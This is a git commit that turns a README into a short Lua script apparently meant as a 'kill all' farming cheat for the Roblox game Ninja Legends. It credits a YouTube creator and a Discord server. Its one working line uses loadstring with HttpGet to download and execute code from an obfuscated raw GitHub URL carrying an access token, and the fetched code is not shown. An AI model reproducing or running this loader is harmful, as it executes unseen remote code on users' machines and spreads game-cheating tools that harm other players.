cc7081b5334d249c5a766bf84a9abca4765d7fb9
666-1238 <97841780+666-1238@users.noreply.github.com>
2022-02-09 15:52:04 +0000

    Update and rename README.md to NinjaLegendsKillAllFarm.lua

---
+++ NinjaLegendsKillAllFarm.lua
@@ -0,0 +1,5 @@
+-- This Script Was Created By MOTURRR
+-- Youtube Link: https://www.youtube.com/channel/UCGUhiNREkUiK7jP2_uSjSlQ
+-- Discord Server Link: https://discord.gg/PXXnZjp9PF
+local Karma = Dark -- Change To Dark, Or Light, Or MOTURRR (Recommended)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/666-1238/dfsdfafdafafdasfsdfasfdasfsdf/main/Source.asdygASDGsdGOSDGA?token=GHSAT0AAAAAABQUGI47SNAC4J3VTN6GJN54YQD4JOA",true))()
